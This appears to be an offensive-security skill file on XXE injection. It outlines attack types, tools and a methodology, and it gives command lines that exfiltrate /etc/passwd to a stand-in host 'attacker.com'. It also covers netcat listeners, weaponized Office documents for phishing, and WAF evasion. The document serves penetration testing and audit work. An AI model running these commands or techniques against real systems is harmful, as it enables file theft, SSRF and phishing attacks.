# web-xxe

# Skill: XML External Entity (XXE) Injection

> **Supplementary Files**:
> - `payloads.md` -- XXE attack payloads organized by category (basic detection, file disclosure, blind XXE, OOB exfiltration, XXE to SSRF, Office document XXE, WAF bypass)
> - `test-cases.md` -- Structured test cases with severity levels, preconditions, and expected results (6 test cases covering XXE detection through Office document exploitation)

## Summary

Web Xxe skill domain covering web attack operations.

**Tools**: XXEinjector, oxml_xxe, xxeplus, Burp Suite, odat, netcat

**Domain**: web-attack

**OWASP**: A05:2021-Security Misconfiguration

## Description

XML External Entity (XXE) injection exploits vulnerable XML parsers to read local files, initiate SSRF attacks, exfiltrate data through out-of-band channels, and cause denial of service. XXE arises when applications process user-supplied XML without disabling external entity resolution or DTD processing. The attack leverages the XML specification's built-in features -- entity definitions and external references -- which were designed for document modularity but become attack vectors when applied to untrusted input.

**Core Attack Types**:

- **Classic XXE**: Direct file disclosure through in-band entity injection. The server resolves the external entity and returns file contents in the HTTP response. Most effective against SOAP endpoints, REST APIs accepting XML, and file upload features processing XML-based formats (SVG, DOCX, XLSX).
- **Blind XXE**: The server processes the external entity but does not return the result in the response. Requires out-of-band (OOB) channels (DNS, HTTP, FTP) to exfiltrate data. Common against applications that silently parse XML without reflecting content.
- **Error-Based XXE**: Leverages XML parser error messages that include entity content. When the parser fails on malformed data, error output may contain the resolved entity value, providing indirect file disclosure.
- **XXE to SSRF**: Uses external entities to force the XML parser to make requests to internal services, accessing cloud metadata endpoints, internal APIs, and private network resources.

**Advanced Vectors**: Parameter entity exploitation for DTD-based attacks, Office document (OOXML) injection via oxml_xxe for social engineering delivery, multi-stage payload construction for WAF bypass, and XXE combined with XInclude for injection points that only control partial XML content.

---

## Use Cases

1. **Web Application Penetration Testing**: Identify XML-processing endpoints (SOAP, REST APIs, file uploads, SVG processing) and exploit XXE to read server files, access internal services, or achieve SSRF.
2. **Cloud Environment Assessment**: Use XXE to SSRF to reach cloud metadata endpoints (AWS/GCP/Azure), extracting temporary credentials and instance configuration from behind the trust boundary.
3. **Social Engineering Delivery**: Craft weaponized Office documents (DOCX, XLSX, PPTX) with embedded XXE payloads using oxml_xxe, distributing them via phishing campaigns to trigger server-side XML processing on document management systems.
4. **Bug Bounty Hunting**: Quickly identify XML input points on target applications, construct layered OOB exfiltration payloads, and demonstrate high-impact file disclosure or SSRF to internal resources.
5. **Security Code Audit**: Review XML parser configuration across the application stack, identify libraries with external entity resolution enabled by default, and verify that defense measures (disabling DTDs, entity resolution) are correctly implemented.

---

## Core Tools

| Tool | Purpose | Command Example |
|------|---------|-----------------|
| **XXEinjector** | Automated XXE exploitation with OOB exfiltration, supports blind XXE via DNS/HTTP/FTP channels | `ruby XXEinjector.rb --host=attacker.com --file=/etc/passwd --oob=http --verbose` |
| **oxml_xxe** | Weaponize Office documents (DOCX/XLSX/PPTX) with embedded XXE payloads for social engineering | `python3 oxml_xxe.py --file template.docx --inject --payload xxe.dtd --output malicious.docx` |
| **xxeplus** | Advanced XXE exploitation toolkit with WAF bypass, encoding obfuscation, and multi-stage payload construction | `python3 xxeplus.py --target http://target/api --method POST --payload blind-xxe` |
| **Burp Suite** | Manual testing, request interception, payload encoding, Collaborator for blind XXE OOB detection | Repeater module with custom XML payload; Collaborator tab for OOB callback monitoring |
| **odat** | Oracle database TNS listener exploitation via XXE, including database credential extraction and OS command execution | `odat.py utlhttp --server-ip target --server-port 1521 --dSid ORCL --getFile /etc/passwd` |
| **netcat** | Set up listener for HTTP/FTP OOB exfiltration channels to receive leaked data | `nc -lvnp 80` or `nc -lvnp 2121` for FTP-based data capture |

Auxiliary tools: **curl** (quick payload testing), **Python http.server** (simple HTTP listener for OOB callbacks), **Burp Collaborator** (managed OOB infrastructure), **interactsh** (open-source OOB callback service), **xmllint** (local XML validation and parser behavior testing).

---

## Methodology

### Attack Chain

```
[1] Endpoint Discovery     [2] Basic XXE Test       [3] Escalation
    - SOAP / REST APIs         - Classic file read       - Blind XXE (OOB)
    - File uploads (XML)       - /etc/passwd proof       - Error-based XXE
    - SVG / DOCX parsing       - Entity injection        - XXE to SSRF
    - Content-Type fuzz             |                    - Parameter entities
                                     v                    - XInclude injection
                                [4] Exfiltration        [5] Weaponize
                                    - OOB DNS channel       - Office document XXE
                                    - OOB HTTP/FTP          - oxml_xxe crafting
                                    - Multi-stage DTD       - Social engineering
                                    - WAF bypass encoding   - Delivery vectors
```

**Key Principle**: Every XXE test must confirm three elements -- (1) the application accepts XML input, (2) the XML parser resolves external entities, and (3) the resolved content can be recovered (in-band, error-based, or OOB).

## Practical Steps

### 1. Detect XML-Processing Endpoints
Identify all endpoints that accept, parse, or process XML content. Test SOAP web services, REST APIs with XML content types (`application/xml`, `text/xml`), file upload features that process XML-based formats (SVG images, Office documents, RSS feeds), and any endpoint that echoes XML content in responses. Use Content-Type fuzzing to discover endpoints that accept XML even when not advertised.

### 2. Test Basic XXE File Disclosure
Inject a classic XXE payload to read `/etc/passwd` (or `/etc/hostname` for lower impact). If the parser resolves external entities and the response includes the file content, the vulnerability is confirmed in-band. Use `file:///etc/passwd` for local file access and `http://` entities for SSRF validation.

### 3. Escalate to Blind XXE
When the response does not contain entity content, switch to OOB techniques. Host a DTD file on an attacker-controlled server that defines parameter entities to load file content and exfiltrate it via DNS lookups or HTTP requests. Use XXEinjector for automated blind XXE exploitation with multiple exfiltration channels.

### 4. Exfiltrate Data via OOB Channels
Set up netcat listeners or a Python HTTP server to receive exfiltrated data. Construct multi-stage DTD payloads where the first entity reads a file and the second entity sends the content to the attacker's listener via HTTP GET parameters or FTP. For DNS exfiltration, encode file content as subdomain labels in DNS queries to an attacker-controlled authoritative DNS server.

### 5. Weaponize Office Documents
Use oxml_xxe to inject XXE payloads into legitimate Office document templates (DOCX, XLSX, PPTX). These documents use OOXML format internally, which is XML-based and processed by many document management systems, antivirus engines, and collaboration platforms. Combine with social engineering (phishing emails, shared documents) to deliver the weaponized files to targets that automatically process uploaded documents server-side.

> **For detailed payloads see `payloads.md`, and for the complete test checklist see `test-cases.md`.**

---

## Defense Evasion Techniques

Evade XXE detection by: encoding entity declarations in UTF-16 or other character encodings to bypass keyword-based WAF rules that only inspect ASCII, using parameter entities instead of general entities to bypass entity-specific filters, splitting DOCTYPE declarations across multiple lines or using XML comments to break pattern matching, leveraging XInclude as an alternative injection vector when DOCTYPE is filtered, and using custom protocol handlers (expect://, php://filter) when the XML parser supports them to bypass file:// restrictions.

---

## Advanced Techniques

Advanced XXE exploitation includes: multi-stage DTD payloads where a remote DTD defines parameter entities that construct exfiltration URLs dynamically, XSLT injection combined with XXE for code execution in XSLT-capable processors, XXE through SAML assertions in single sign-on systems that parse XML assertion payloads, exploiting chained entity expansion (billion laughs) for denial of service, and using the `expect://` protocol handler in PHP for direct command execution through XXE. For .NET environments, explore `System.Xml.XmlReader` settings and `XmlResolver` configuration for bypass opportunities.

---
